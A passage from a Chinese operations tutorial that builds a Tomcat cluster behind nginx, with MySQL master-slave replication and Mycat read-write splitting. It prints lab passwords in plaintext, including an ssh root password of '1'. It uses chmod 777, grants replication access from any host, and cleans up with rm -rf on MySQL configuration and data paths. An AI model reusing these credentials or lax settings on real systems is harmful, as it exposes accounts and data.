$CATALINA_BASE/bin/shutdown.sh</span><br><span class="line">esac</span><br><span class="line">EOF</span><br><span class="line">cat &gt;/usr/local/tomcat2/bin/start.sh &lt;&lt;&#x27;EOF&#x27;</span><br><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line"><span class="meta">#</span><span class="bash">tomcat2</span></span><br><span class="line">export CATALINA_BASE=&quot;/usr/local/tomcat2&quot;</span><br><span class="line">case &quot;$1&quot; in</span><br><span class="line">start)</span><br><span class="line">    $CATALINA_BASE/bin/startup.sh</span><br><span class="line">    ;;</span><br><span class="line">stop)</span><br><span class="line">    $CATALINA_BASE/bin/shutdown.sh</span><br><span class="line">esac</span><br><span class="line">EOF</span><br><span class="line">cat &gt;/usr/local/tomcat3/bin/start.sh &lt;&lt;&#x27;EOF&#x27;</span><br><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line"><span class="meta">#</span><span class="bash">tomcat3</span></span><br><span class="line">export CATALINA_BASE=&quot;/usr/local/tomcat3&quot;</span><br><span class="line">case &quot;$1&quot; in</span><br><span class="line">start)</span><br><span class="line">    $CATALINA_BASE/bin/startup.sh</span><br><span class="line">    ;;</span><br><span class="line">stop)</span><br><span class="line">    $CATALINA_BASE/bin/shutdown.sh</span><br><span class="line">esac</span><br><span class="line">EOF</span><br><span class="line">chmod 777 /usr/local/&#123;tomcat,tomcat1,tomcat2,tomcat3&#125;/bin/start.sh</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 第二个脚本，此脚本用于启动或关闭tomcat</span></span><br><span class="line">[root@tomcat local]# vim re-tomcat.sh</span><br><span class="line">/usr/local/tomcat/bin/start.sh $1</span><br><span class="line">/usr/local/tomcat1/bin/start.sh $1</span><br><span class="line">/usr/local/tomcat2/bin/start.sh $1</span><br><span class="line">/usr/local/tomcat3/bin/start.sh $1</span><br><span class="line"><span class="meta">#</span><span class="bash"> 查看端口</span></span><br><span class="line">[root@tomcat local]# ss -tnlp</span><br><span class="line">State       Recv-Q Send-Q          Local Address:Port                         Peer Address:Port              </span><br><span class="line">users:((&quot;master&quot;,pid=1403,fd=13))LISTEN      0      100                      :::8080 </span><br><span class="line">users:((&quot;java&quot;,pid=3708,fd=43))LISTEN      0      100                        :::8049   </span><br><span class="line">users:((&quot;java&quot;,pid=4849,fd=44))LISTEN      0      100                        :::8081</span><br><span class="line">users:((&quot;java&quot;,pid=4819,fd=43))LISTEN      0      100                        :::8082   </span><br><span class="line">users:((&quot;java&quot;,pid=4828,fd=43))LISTEN      0      100                        :::8083</span><br><span class="line">users:((&quot;java&quot;,pid=4839,fd=43))LISTEN      0      100                        :::8019</span><br><span class="line">users:((&quot;java&quot;,pid=4819,fd=44))LISTEN      0      100                        :::8084   </span><br><span class="line">users:((&quot;master&quot;,pid=1403,fd=14))LISTEN      0      100                      :::8029 </span><br><span class="line">users:((&quot;java&quot;,pid=4828,fd=44))LISTEN      0      1            ::ffff:127.0.0.1:8005   </span><br><span class="line">users:((&quot;java&quot;,pid=3708,fd=49))LISTEN      0      100                        :::8039   </span><br><span class="line">users:((&quot;java&quot;,pid=4839,fd=44))LISTEN      0      100                        :::8009</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> tomcat2 部署</span></span><br><span class="line">[root@tomcat2 ~]# cd /usr/local/</span><br><span class="line">[root@tomcat2 local]# scp -r 10.3.131.236:/usr/local/&#123;tomcat1,tomcat2,tomcat3,tomcat,java,re-tomcat.sh&#125; ./</span><br><span class="line">[root@tomcat2 local]# vim /etc/profile.d/jdk.sh</span><br><span class="line">JAVA_HOME=/usr/local/java</span><br><span class="line">PATH=$JAVA_HOME/bin:$PATH</span><br><span class="line">export JAVA_HOME PATH</span><br><span class="line">CATALINA_HOME=/usr/local/tomcat</span><br><span class="line">export CATALINA_HOME</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> tomcat &amp;&amp; tomcat 1</span> </span><br><span class="line">[root@tomcat1 local]# sh /usr/local/re-tomcat.sh start</span><br><span class="line">[root@tomcat2 local]# sh /usr/local/re-tomcat.sh start</span><br><span class="line"></span><br></pre></td></tr></table></figure><h6 id="测试访问（8个端口全部访问）"><a href="#测试访问（8个端口全部访问）" class="headerlink" title="测试访问（8个端口全部访问）"></a>测试访问（8个端口全部访问）</h6><p>[外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-EAtrdsHP-1577026511140)(C:\Users\newrain\AppData\Roaming\Typora\typora-user-images\1576825666399.png)]</p><h6 id="nginx反向代理，代理tomcat集群"><a href="#nginx反向代理，代理tomcat集群" class="headerlink" title="nginx反向代理，代理tomcat集群"></a>nginx反向代理，代理tomcat集群</h6><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 两台nginx上修改配置</span></span><br><span class="line">upstream testweb &#123;</span><br><span class="line">        server 10.3.131.236:8081 weight=1 max_fails=1 fail_timeout=2s;</span><br><span class="line">        server 10.3.131.236:8082 weight=1 max_fails=1 fail_timeout=2s;</span><br><span class="line">        server 10.3.131.236:8083 weight=1 max_fails=1 fail_timeout=2s;</span><br><span class="line">        server 10.3.131.236:8084 weight=1 max_fails=1 fail_timeout=2s;</span><br><span class="line">        server 10.3.131.237:8081 weight=1 max_fails=1 fail_timeout=2s;</span><br><span class="line">        server 10.3.131.237:8082 weight=1 max_fails=1 fail_timeout=2s;</span><br><span class="line">        server 10.3.131.237:8083 weight=1 max_fails=1 fail_timeout=2s;</span><br><span class="line">        server 10.3.131.237:8084 weight=1 max_fails=1 fail_timeout=2s;</span><br><span class="line">&#125;  </span><br></pre></td></tr></table></figure><h1 id="第四次架构测试，mysql一主两从，增加读写分离"><a href="#第四次架构测试，mysql一主两从，增加读写分离" class="headerlink" title="第四次架构测试，mysql一主两从，增加读写分离"></a>第四次架构测试，mysql一主两从，增加读写分离</h1><h6 id="环境准备-3"><a href="#环境准备-3" class="headerlink" title="环境准备"></a>环境准备</h6><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">centos 7.6 1台 部署单机两实例</span><br><span class="line">前端mysql做读写分离</span><br><span class="line">主库ip 10.3.131.239：3306</span><br><span class="line">从库ip 10.3.131.238：3306,3307</span><br><span class="line"></span><br></pre></td></tr></table></figure><h6 id="环境部署-2"><a href="#环境部署-2" class="headerlink" title="环境部署"></a>环境部署</h6><p>从库采用编译安装</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">清理安装环境：</span><br><span class="line"><span class="meta">#</span><span class="bash"> yum erase mariadb mariadb-server mariadb-libs mariadb-devel -y</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> userdel -r mysql</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> rm -rf /etc/my*</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> rm -rf /var/lib/mysql</span></span><br><span class="line">[root@mysql2 ~]# groupadd mysql</span><br><span class="line">[root@mysql2 ~]# useradd -r -g mysql -M -s /bin/false mysql</span><br><span class="line">[root@mysql2 ~]# yum -y install ncurses ncurses-devel openssl-devel bison gcc gcc-c++ make cmake  # mysql 编译安装依赖 </span><br><span class="line">https://dev.mysql.com/get/Downloads/MySQL-5.7/mysql-5.7.12.tar.gz</span><br><span class="line">[root@mysql2 ~]# wget https://dev.mysql.com/get/Downloads/MySQL-5.7/mysql-boost-5.7.28.tar.gz</span><br><span class="line">[root@mysql2 ~]# tar xf mysql-boost-5.7.28.tar.gz</span><br><span class="line">[root@mysql2 ~]# cd mysql-5.7.28/</span><br><span class="line">[root@mysql2 ~]# mkdir /data  # 数据目录</span><br><span class="line">[root@mysql2 ~]# cmake . \</span><br><span class="line">-DWITH_BOOST=boost \</span><br><span class="line">-DCMAKE_INSTALL_PREFIX=/usr/local/mysql \</span><br><span class="line">-DSYSCONFDIR=/etc \</span><br><span class="line">-DMYSQL_DATADIR=/data \</span><br><span class="line">-DINSTALL_MANDIR=/usr/share/man \</span><br><span class="line">-DMYSQL_TCP_PORT=3306 \</span><br><span class="line">-DMYSQL_UNIX_ADDR=/tmp/mysql.sock \</span><br><span class="line">-DDEFAULT_CHARSET=utf8 \</span><br><span class="line">-DEXTRA_CHARSETS=all \</span><br><span class="line">-DDEFAULT_COLLATION=utf8_general_ci \</span><br><span class="line">-DWITH_READLINE=1 \</span><br><span class="line">-DWITH_SSL=system \</span><br><span class="line">-DWITH_EMBEDDED_SERVER=1 \</span><br><span class="line">-DENABLED_LOCAL_INFILE=1 \</span><br><span class="line">-DWITH_INNOBASE_STORAGE_ENGINE=1</span><br><span class="line"></span><br><span class="line">[root@mysql2 ~]# make &amp;&amp; make install</span><br><span class="line">[root@mysql2 ~]# cd /usr/local/mysql</span><br><span class="line">[root@mysql2 mysql]# chown -R mysql.mysql .</span><br><span class="line"><span class="meta">#</span><span class="bash"> 第一个实例配置</span></span><br><span class="line">[root@mysql2 mysql]# ./bin/mysqld --initialize --user=mysql --basedir=/usr/local/mysql --datadir=/data</span><br><span class="line">[root@mysql2 mysql]#  bin/mysql_ssl_rsa_setup --datadir=/data</span><br><span class="line">[root@mysql2 mysql]# vim /etc/my.cnf</span><br><span class="line">[mysqld]</span><br><span class="line">basedir=/usr/local/mysql</span><br><span class="line">datadir=/data</span><br><span class="line">[root@mysql2 mysql]# bin/mysqld_safe --user=mysql &amp;</span><br><span class="line">[root@mysql2 mysql]# cat /etc/profile.d/mysql.sh</span><br><span class="line">PATH=$PATH:/usr/local/mysql/bin </span><br><span class="line">[root@mysql2 mysql]# source ~/.bash_profile</span><br><span class="line">[root@mysql2 mysql]# cp support-files/mysql.server /etc/init.d/mysqld</span><br><span class="line">[root@mysql2 mysql]# chkconfig --add mysqld</span><br><span class="line">[root@mysql2 mysql]# chkconfig mysqld on</span><br><span class="line">[root@mysql2 mysql]# service mysqld start</span><br><span class="line">[root@mysql2 mysql]# mysqladmin -p&#x27;vuXciQ9d9n&lt;;&#x27; password &#x27;QianFeng@123&#x27;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 第二个实例配置</span></span><br><span class="line">[root@mysql2 ~]# cat /etc/my.cnf </span><br><span class="line">[mysqld]</span><br><span class="line">basedir=/usr/local/mysql</span><br><span class="line">datadir=/data</span><br><span class="line">port=3306</span><br><span class="line">socket=/tmp/mysql.sock</span><br><span class="line">symbolic-links=0</span><br><span class="line">user=mysql</span><br><span class="line"></span><br><span class="line">[root@mysql2 ~]# cat /etc/my2.cnf </span><br><span class="line">[mysqld]</span><br><span class="line">basedir=/usr/local/mysql</span><br><span class="line">datadir=/data2</span><br><span class="line">port=3307</span><br><span class="line">socket=/tmp/mysql2.sock</span><br><span class="line">symbolic-links=0</span><br><span class="line">user=mysql</span><br><span class="line"></span><br><span class="line">[root@mysql2 mysql]# mkdir /data2</span><br><span class="line"><span class="meta">#</span><span class="bash"> 初始化实例2</span></span><br><span class="line">[root@mysql2 mysql]# mysqld --defaults-file=/etc/my2.cnf --initialize --user=mysql --basedir=/usr/local/mysql --datadir=/data2</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 编写脚本管理数据库</span></span><br><span class="line">[root@mysql2 ~]# cat /usr/bin/mod-mysql </span><br><span class="line"><span class="meta">#</span><span class="bash">!/usr/bin/bash</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> mysql2</span></span><br><span class="line">if [[ $# -ne 1 ]];then</span><br><span class="line">echo &quot;错误的参数个数&quot;</span><br><span class="line">exit 1</span><br><span class="line">fi</span><br><span class="line">case $1 in</span><br><span class="line">imysql2)</span><br><span class="line">mysql -uroot -p&#x27;QianFeng!123&#x27; -P 3307 -S /tmp/mysql2.sock</span><br><span class="line">;;</span><br><span class="line"><span class="meta">#</span><span class="bash"> mysql1</span></span><br><span class="line">imysql1)</span><br><span class="line">mysql -uroot -p&#x27;QianFeng@123&#x27;</span><br><span class="line">;;</span><br><span class="line"><span class="meta">#</span><span class="bash"> 启动</span></span><br><span class="line">smysql2)</span><br><span class="line">nohup /usr/local/mysql/bin/mysqld --defaults-file=/etc/my2.cnf --datadir=/data2/ --user=mysql &amp;</span><br><span class="line">;;</span><br><span class="line">smysql1)</span><br><span class="line">service mysqld start</span><br><span class="line">;;</span><br><span class="line">tmysql1)</span><br><span class="line">service mysqld stop</span><br><span class="line">;;</span><br><span class="line">tmysql2)</span><br><span class="line">mysqladmin -S /tmp/mysql2.sock -P 3307 -p&#x27;QianFeng!123&#x27; shutdown</span><br><span class="line">;;</span><br><span class="line">esac</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 修改密码</span></span><br><span class="line">[root@mysql2 ~]# mysqladmin -uroot -p&#x27;sNW7Tlr??c%-&#x27; password &#x27;QianFeng!123&#x27; -P 3307 -S /tmp/mysql2.sock</span><br><span class="line"></span><br></pre></td></tr></table></figure><h6 id="主从同步"><a href="#主从同步" class="headerlink" title="主从同步"></a>主从同步</h6><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 主库</span></span><br><span class="line">[root@mysql1 ~]# mkdir -pv /data/binlog</span><br><span class="line">[root@mysql1 ~]# chown -R mysql /data/binlog</span><br><span class="line">[root@mysql1 ~]# cat /etc/my.cnf</span><br><span class="line">server-id=1</span><br><span class="line">log_bin=/data/binlog/mysql-bin.log   #(注意mysql需要有该目录写权限, chown mysql binlog/)</span><br><span class="line">expire_logs_days=3</span><br><span class="line">max_binlog_size=100M </span><br><span class="line">binlog_format=row  #(指定binlog格式  有row mixed等3种格式) </span><br><span class="line">max_allowed_packet=32M</span><br><span class="line"></span><br><span class="line">[root@mysql1 ~]# systemctl restart mysqld</span><br><span class="line">[root@mysql1 ~]# mysql -pQianFeng@123</span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> grant replication slave,replication client on *.* to <span class="string">&#x27;slave&#x27;</span>@<span class="string">&#x27;%&#x27;</span> identified by <span class="string">&#x27;QianFeng@@123&#x27;</span>;</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 记录偏移量</span></span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> show master status\G</span></span><br><span class="line">*************************** 1. row ***************************</span><br><span class="line">             File: mysql-bin.000001</span><br><span class="line">         Position: 458</span><br><span class="line">     Binlog_Do_DB: </span><br><span class="line"> Binlog_Ignore_DB: </span><br><span class="line">Executed_Gtid_Set: </span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> <span class="built_in">set</span> global event_scheduler=off;</span></span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> FLUSH TABLES WITH READ LOCK;</span></span><br><span class="line">(注意：在退出MySQL终端的时候都会隐式的执行unlock tables。也就是如果要让表锁定生效就必须一直保持对话。锁表之前确认mysql只剩下自己的操作)</span><br><span class="line"><span class="meta">#</span><span class="bash"> 另开一个终端，不要关闭已经上锁的mysql终端</span></span><br><span class="line">[root@mysql1 ~]# mysqldump -R -E --default-character-set=utf8 -uroot -p&#x27;QianFeng@123&#x27; jspgou &gt; data.sql</span><br><span class="line">[root@mysql1 ~]# scp data.sql 10.3.131.238:/root/data.sql</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 两台从库</span></span><br><span class="line">[root@mysql2 ~]# mkdir /&#123;data,data2&#125;/binlog</span><br><span class="line">[root@mysql2 ~]# chown mysql /&#123;data,data2&#125;/binlog</span><br><span class="line"><span class="meta">#</span><span class="bash"> 修改配置文件</span></span><br><span class="line">[root@mysql2 ~]# vim /etc/my.cnf</span><br><span class="line">event_scheduler=0  #关闭event归档，0为关闭</span><br><span class="line"><span class="meta">#</span><span class="bash">slave</span></span><br><span class="line">server-id=2</span><br><span class="line"><span class="meta">#</span><span class="bash">replicate-rewrite-db=dbname1-&gt;dbname1  同步单个库使用</span></span><br><span class="line"><span class="meta">#</span><span class="bash">replicate-do-db=dbname1                同步单个库使用</span></span><br><span class="line">log_bin=/data/binlog/mysql-bin.log</span><br><span class="line">relay_log=/data/binlog/mysql-relay-bin.log</span><br><span class="line">expire_logs_days=3</span><br><span class="line">max_binlog_size=100M</span><br><span class="line">binlog_format=row </span><br><span class="line">slave-net-timeout=60 </span><br><span class="line">max_allowed_packet=32M</span><br><span class="line">log_bin_trust_function_creators=1</span><br><span class="line"></span><br><span class="line">[root@mysql2 ~]# vim /etc/my2.cnf</span><br><span class="line">event_scheduler=0  #关闭event归档，0为关闭</span><br><span class="line"><span class="meta">#</span><span class="bash">slave</span></span><br><span class="line">server-id=3</span><br><span class="line"><span class="meta">#</span><span class="bash">replicate-rewrite-db=dbname1-&gt;dbname1  同步单个库使用</span></span><br><span class="line"><span class="meta">#</span><span class="bash">replicate-do-db=dbname1                同步单个库使用</span></span><br><span class="line">log_bin=/data2/binlog/mysql-bin.log</span><br><span class="line">relay_log=/data2/binlog/mysql-relay-bin.log</span><br><span class="line">expire_logs_days=3</span><br><span class="line">max_binlog_size=100M</span><br><span class="line">binlog_format=row </span><br><span class="line">slave-net-timeout=60 </span><br><span class="line">max_allowed_packet=32M</span><br><span class="line">log_bin_trust_function_creators=1</span><br><span class="line"></span><br><span class="line">[root@mysql2 ~]# mod-mysql tmysql1</span><br><span class="line">[root@mysql2 ~]# mod-mysql tmysql2</span><br><span class="line">[root@mysql2 ~]# mod-mysql smysql1</span><br><span class="line">[root@mysql2 ~]# mod-mysql smysql2</span><br><span class="line">[root@mysql2 ~]# mod-mysql imysql1</span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> create database jspgou default charset=utf8;</span></span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> use jspgou</span></span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> <span class="built_in">source</span> /root/data.sql</span></span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> edit</span></span><br><span class="line">change master to </span><br><span class="line">master_host=&#x27;10.3.131.239&#x27;,</span><br><span class="line">master_user=&#x27;slave&#x27;,</span><br><span class="line">master_password=&#x27;QianFeng@@123&#x27;,</span><br><span class="line">master_log_file=&#x27;mysql-bin.000001&#x27;,</span><br><span class="line">master_log_pos=458;</span><br><span class="line">[root@mysql2 ~]# mod-mysql imysql2</span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> create database jspgou default charset=utf8;</span></span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> use jspgou</span></span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> <span class="built_in">source</span> /root/data.sql</span></span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> edit</span></span><br><span class="line">change master to </span><br><span class="line">master_host=&#x27;10.3.131.239&#x27;,</span><br><span class="line">master_user=&#x27;slave&#x27;,</span><br><span class="line">master_password=&#x27;QianFeng@@123&#x27;,</span><br><span class="line">master_log_file=&#x27;mysql-bin.000001&#x27;,</span><br><span class="line">master_log_pos=458;</span><br><span class="line"><span class="meta">#</span><span class="bash"> 检查两台同步情况</span></span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> start slave;</span></span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> show slave status\G</span></span><br><span class="line"></span><br><span class="line">        Relay_Master_Log_File: mysql-bin.000001</span><br><span class="line">             Slave_IO_Running: Yes</span><br><span class="line">            Slave_SQL_Running: Yes</span><br><span class="line"></span><br></pre></td></tr></table></figure><h6 id="读写分离"><a href="#读写分离" class="headerlink" title="读写分离"></a>读写分离</h6><p>[外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-ao8VvmxI-1577026511141)(C:\Users\newrain\AppData\Roaming\Typora\typora-user-images\1576831880149.png)]</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mycat ip 10.3.131.244</span><br><span class="line"><span class="meta">#</span><span class="bash"> 环境部署</span></span><br><span class="line">将jdk上传到服务器中，</span><br><span class="line">[root@mycat ~]# tar xf jdk-7u67-linux-x64.tar.gz -C /usr/local/</span><br><span class="line">[root@mycat ~]# cd /usr/local/</span><br><span class="line">[root@mycat local]# mv jdk1.7.0_67 java </span><br><span class="line">设置环境变量</span><br><span class="line">[root@mycat local]# vim /etc/profile.d/java.sh  #添加如下内容，</span><br><span class="line">JAVA_HOME=/usr/local/java</span><br><span class="line">PATH=$JAVA_HOME/bin:$PATH</span><br><span class="line">export CLASSPATH=.:$JAVA_HOME/lib/dt.jar:$JAVA_HOME/lib/tools.jar</span><br><span class="line">[root@mycat local]# source /etc/profile.d/java.sh</span><br><span class="line">下载</span><br><span class="line">[root@mycat ~]# wget http://dl.mycat.io/1.6.5/Mycat-server-1.6.5-release-20180122220033-linux.tar.gz</span><br><span class="line">解压</span><br><span class="line">[root@mycat ~]# tar xf Mycat-server-1.6.5-release-20180122220033-linux.tar.gz -C /usr/local/</span><br><span class="line"><span class="meta">#</span><span class="bash">检测java</span></span><br><span class="line">[root@mycat ~]# java -version</span><br><span class="line">java version &quot;1.7.0_67&quot;</span><br><span class="line">Java(TM) SE Runtime Environment (build 1.7.0_67-b01)</span><br><span class="line">Java HotSpot(TM) 64-Bit Server VM (build 24.65-b04, mixed mode)</span><br><span class="line"><span class="meta">#</span><span class="bash"> 修改tomcat 配置文件</span></span><br><span class="line">[root@mycat ~]# cat /usr/local/mycat/conf/server.xml </span><br><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE mycat:server SYSTEM &quot;server.dtd&quot;&gt;</span><br><span class="line">&lt;mycat:server xmlns:mycat=&quot;http://io.mycat/&quot;&gt;</span><br><span class="line">&lt;user name=&quot;root&quot; defaultAccount=&quot;true&quot;&gt;</span><br><span class="line">&lt;property name=&quot;password&quot;&gt;QianFeng@1234&lt;/property&gt;</span><br><span class="line">&lt;property name=&quot;schemas&quot;&gt;jspgou&lt;/property&gt;</span><br><span class="line">&lt;/user&gt;</span><br><span class="line">&lt;/mycat:server&gt;</span><br><span class="line"></span><br><span class="line">[root@mycat ~]# cat /usr/local/mycat/conf/schema.xml </span><br><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE mycat:schema SYSTEM &quot;schema.dtd&quot;&gt;</span><br><span class="line">&lt;mycat:schema xmlns:mycat=&quot;http://io.mycat/&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;schema name=&quot;jspgou&quot; checkSQLschema=&quot;false&quot; sqlMaxLimit=&quot;100&quot; dataNode=&quot;dn1&quot;&gt;</span><br><span class="line">&lt;/schema&gt;</span><br><span class="line">&lt;dataNode name=&quot;dn1&quot; dataHost=&quot;localhost1&quot; database=&quot;jspgou&quot; /&gt;</span><br><span class="line">&lt;dataHost name=&quot;localhost1&quot; maxCon=&quot;1000&quot; minCon=&quot;10&quot; balance=&quot;0&quot;</span><br><span class="line">  writeType=&quot;0&quot; dbType=&quot;mysql&quot; dbDriver=&quot;native&quot; switchType=&quot;1&quot;  slaveThreshold=&quot;100&quot;&gt;</span><br><span class="line">&lt;heartbeat&gt;select user()&lt;/heartbeat&gt;</span><br><span class="line">&lt;!-- can have multi write hosts --&gt;</span><br><span class="line">&lt;writeHost host=&quot;hostM1&quot; url=&quot;10.3.131.239:3306&quot; user=&quot;mycat&quot;</span><br><span class="line">   password=&quot;QianFeng@123&quot;&gt;</span><br><span class="line">&lt;!-- can have multi read hosts --&gt;</span><br><span class="line">&lt;readHost host=&quot;hostS2&quot; url=&quot;10.3.131.238:3306&quot; user=&quot;mycat&quot; password=&quot;QianFeng@123&quot; /&gt;</span><br><span class="line">&lt;readHost host=&quot;hostS3&quot; url=&quot;10.3.131.238:3307&quot; user=&quot;mycat&quot; password=&quot;QianFeng@123&quot; /&gt;</span><br><span class="line">&lt;/writeHost&gt;</span><br><span class="line">&lt;/dataHost&gt;</span><br><span class="line">&lt;/mycat:schema&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 启动mycat</span></span><br><span class="line">[root@mycat ~]# /usr/local/mycat/bin/mycat </span><br><span class="line">[root@mycat ~]# jps</span><br><span class="line">1796 WrapperSimpleApp</span><br><span class="line">1996 Jps</span><br><span class="line"></span><br><span class="line">[root@mycat conf]# mysql -uroot -p&#x27;QianFeng@1234&#x27; -h 10.3.131.244 -P 8066</span><br><span class="line">Welcome to the MariaDB monitor.  Commands end with ; or \g.</span><br><span class="line">Your MySQL connection id is 3</span><br><span class="line">Server version: 5.6.29-mycat-1.6.5-release-20180122220033 MyCat Server (OpenCloundDB)</span><br><span class="line"></span><br><span class="line">Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.</span><br><span class="line"></span><br><span class="line">Type &#x27;help;&#x27; or &#x27;\h&#x27; for help. Type &#x27;\c&#x27; to clear the current input statement.</span><br><span class="line"></span><br><span class="line">MySQL [(none)]&gt; show databases;</span><br><span class="line">+----------+</span><br><span class="line">| DATABASE |</span><br><span class="line">+----------+</span><br><span class="line">| jspgou   |</span><br><span class="line">+----------+</span><br><span class="line">1 row in set (0.01 sec)</span><br><span class="line"></span><br><span class="line">MySQL [(none)]&gt; use jspgou</span><br><span class="line">Reading table information for completion of table and column names</span><br><span class="line">You can turn off this feature to get a quicker startup with -A</span><br><span class="line"></span><br><span class="line">Database changed</span><br><span class="line">MySQL [jspgou]&gt; show tables;</span><br><span class="line">。。。。</span><br><span class="line">104 rows in set (0.01 sec)</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 完成</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 修改tomcat 的数据库配置</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 两台tomcat 都执行</span></span><br><span class="line">[root@tomcat local]# sed -i &#x27;s#10.3.131.239#10.3.131.244#&#x27; tomcat/webapps/ROOT/WEB-INF/config/jdbc.properties </span><br><span class="line">[root@tomcat local]# sed -i &#x27;s#10.3.131.239#10.3.131.244#&#x27; tomcat1/webapps/ROOT/WEB-INF/config/jdbc.properties </span><br><span class="line">[root@tomcat local]# sed -i &#x27;s#10.3.131.239#10.3.131.244#&#x27; tomcat2/webapps/ROOT/WEB-INF/config/jdbc.properties </span><br><span class="line">[root@tomcat local]# sed -i &#x27;s#10.3.131.239#10.3.131.244#&#x27; tomcat3/webapps/ROOT/WEB-INF/config/jdbc.properties</span><br><span class="line"></span><br><span class="line">重启tomcat  </span><br><span class="line">[root@tomcat local]# sh /usr/local/re-tomcat.sh stop</span><br><span class="line">[root@tomcat local]# sh /usr/local/re-tomcat.sh start</span><br></pre></td></tr></table></figure><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><h3 id="集群介绍"><a href="#集群介绍" class="headerlink" title="集群介绍"></a>集群介绍</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">nginx---tomcat 4实例             mysql 从</span><br><span class="line">前端 lvs ---                 ---mycat--- mysql 主</span><br><span class="line">nginx---tomcat 4实例             mysql 从</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 账号密码信息</span></span><br><span class="line">lvs dip  10.3.131.76  vip 10.3.131.235</span><br><span class="line">nginx 1   ip 10.3.131.231</span><br><span class="line">nginx 2   ip 10.3.131.230</span><br><span class="line">mysql 主  ip 10.3.131.239 用户 slave QianFeng@@123(主从) 用户root QianFeng@123 用户 mycat QianFeng@123</span><br><span class="line">mysql 从  ip 10.3.131.238 用户m1上 root QianFeng@123 m2上 root QianFeng!123 mycat QianFeng@123（相同）</span><br><span class="line">mycat     ip 10.3.131.244 用户 root  QianFeng@1234</span><br><span class="line">tomcat 1  ip 10.3.131.236 端口 8081/8082/8083/8084</span><br><span class="line">tomcat 2  ip 10.3.131.237 端口 8081/8082/8083/8084</span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># ssh登录账号root  密码为1</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 控制方式</span></span><br><span class="line">lvs systemctl start ipvsadm</span><br><span class="line">nginx /usr/local/nginx/sbin/nginx </span><br><span class="line">tomcat /usr/local/re-tomcat.sh start|stop</span><br><span class="line">mycat  /usr/local/mycat/bin/mycat  start|stop</span><br><span class="line">mysql主 systemctl start mysqld</span><br><span class="line">mysql从 mod-mysql imysql1|imysql2# 进入mysql客户端</span><br><span class="line">        mod-mysql smysql1|smysql2 # 启动mysql</span><br><span class="line">        mod-mysql tmysql1|tmysql2 # 停止myqsl   1和2是两个实例 mod-mysql是启动脚本</span><br><span class="line">       数据目录 /data  /data2  配置文件  /etc/my.cnf  /etc/my2.cnf</span><br><span class="line">       </span><br><span class="line"><span class="meta">#</span><span class="bash"> 测试页面</span></span><br><span class="line">http://10.3.131.235/jeeadmin/jspgou/index.do#/login</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> operations </category>
          
          <category> 架构 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 运维 </tag>
            
            <tag> 架构 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>nginx+tomcat+redis实现session共享</title>
      <link href="2020/12/04/nginx+tomcat+redis%E5%AE%9E%E7%8E%B0session%E5%85%B1%E4%BA%AB/"/>
      <url>2020/12/04/nginx+tomcat+redis%E5%AE%9E%E7%8E%B0session%E5%85%B1%E4%BA%AB/</url>
      
